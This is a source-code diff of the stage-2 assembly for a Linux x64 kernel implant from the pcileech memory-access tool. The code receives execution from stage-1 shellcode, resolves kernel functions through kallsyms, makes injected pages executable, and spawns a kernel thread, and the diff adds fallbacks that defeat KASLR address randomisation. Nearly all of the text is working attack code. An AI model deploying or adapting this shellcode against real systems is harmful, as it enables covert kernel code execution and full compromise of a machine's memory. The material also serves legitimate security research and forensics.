@@ -1,7 +1,7 @@
 ; lx64_stage2.asm : assembly to receive execution from stage1 shellcode.
 ; Compatible with Linux x64.
 ;
-; (c) Ulf Frisk, 2016
+; (c) Ulf Frisk, 2016, 2017
 ; Author: Ulf Frisk, pcileech@frizk.net
 ;
 
@@ -101,7 +101,7 @@ setup PROC
 	TEST rax, rax
 	JZ error
 	MOV rdi, 14h
-	MOV rsi, 1h
+	MOV rsi, 2h
 	CALL rax
 	TEST rax, rax
 	JZ error
@@ -117,6 +117,7 @@ setup PROC
 	; ----------------------------------------------------
 	; 2: SET CODE PAGE TO EXECUTABLE
 	; ----------------------------------------------------
+	LEA rax, main
 	LEA rdi, str_set_memory_x
 	CALL r14
 	TEST rax, rax
@@ -142,11 +143,12 @@ setup PROC
 	JNZ copy_stage3_pre_loop
 	; ----------------------------------------------------
 	; 4: CREATE THREAD & SET UP DATA AREA
+	; (try kthread_create_on_node 1st, kthread_create 2nd)
 	; ----------------------------------------------------
 	LEA rdi, str_kthread_create_on_node
 	CALL r14
 	TEST rax, rax
-	JZ error
+	JZ thread_kthread_create
 	MOV rdi, r12
 	ADD rdi, 01000h
 	XOR rsi, rsi
@@ -155,12 +157,26 @@ setup PROC
 	LEA rcx, str_pcileech
 	CALL rax
 	TEST rax, rax
+	JZ thread_kthread_create
+	JMP thread_start
+	thread_kthread_create:
+	LEA rdi, str_kthread_create
+	CALL r14
+	TEST rax, rax
 	JZ error
-	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD
-	MOV [r12+10h], r14   ; KMDDATA.AddrKallsymsLookupName
+	MOV rdi, r12
+	ADD rdi, 01000h
+	XOR rsi, rsi
+	LEA rdx, str_pcileech
+	CALL rax
+	TEST rax, rax
+	JZ error
 	; ----------------------------------------------------
 	; 5: START THREAD
 	; ----------------------------------------------------
+	thread_start:
+	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD
+	MOV [r12+10h], r14   ; KMDDATA.AddrKallsymsLookupName
 	LEA rdi, str_wake_up_process
 	CALL r14
 	TEST rax, rax
@@ -186,14 +202,47 @@ setup PROC
 	RET
 setup ENDP
 
-m_phys_to_virt PROC
+; ------------------------------------------------------------------
+; Retrieve the PAGE_OFFSET_BASE
+; r14 -> kallsyms_lookup_name
+; rax <- value of PAGE_OFFSET_BASE
+; ------------------------------------------------------------------
+m_page_offset_base PROC
+	LEA rdi, str_page_offset_base
+	CALL r14
+	TEST rax, rax
+	JZ kaslr_pg_disable
+	MOV rax, [rax]
+	RET
+	kaslr_pg_disable:
 	MOV rax, 0ffff880000000000h
+	RET
+m_page_offset_base ENDP
+
+m_phys_to_virt PROC
+	PUSH rdi
+	CALL m_page_offset_base
+	POP rdi
 	ADD rax, rdi
 	RET
 m_phys_to_virt ENDP
 
-m_page_to_phys PROC
+m_vmemmap_base PROC
+	LEA rdi, str_vmemmap_base
+	CALL r14
+	TEST rax, rax
+	JZ kaslr_memmap_disable
+	MOV rax, [rax]
+	RET
+	kaslr_memmap_disable:
 	MOV rax, 0ffffea0000000000h
+	RET
+m_vmemmap_base ENDP
+
+m_page_to_phys PROC
+	PUSH rdi
+	CALL m_vmemmap_base
+	POP rdi
 	SUB rdi, rax
 	SHR rdi, 7		; PFN
 	SHL rdi, 12
@@ -208,10 +257,9 @@ m_page_to_phys ENDP
 ; ----------------------------------------------------
 clear_8k PROC
 	XOR rax, rax
-	MOV rcx, 1024
-	loop_8k:
-	MOV [rdi+8*rcx-8], rax
-	LOOP loop_8k
+	MOV ecx, 1024
+	CLD
+	REP STOSQ [rdi]
 	RET
 clear_8k ENDP
 
@@ -238,10 +286,13 @@ lx64_stage3_pre PROC
 	JZ label_main_loop
 lx64_stage3_pre ENDP
 
+str_kthread_create			db 'kthread_create', 0
 str_kthread_create_on_node	db 'kthread_create_on_node', 0
 str_alloc_pages_current		db 'alloc_pages_current', 0
 str_set_memory_x			db 'set_memory_x', 0
 str_wake_up_process			db 'wake_up_process', 0
+str_page_offset_base		db 'page_offset_base', 0
+str_vmemmap_base			db 'vmemmap_base', 0
 str_pcileech				db 'pcileech', 0
 
 END
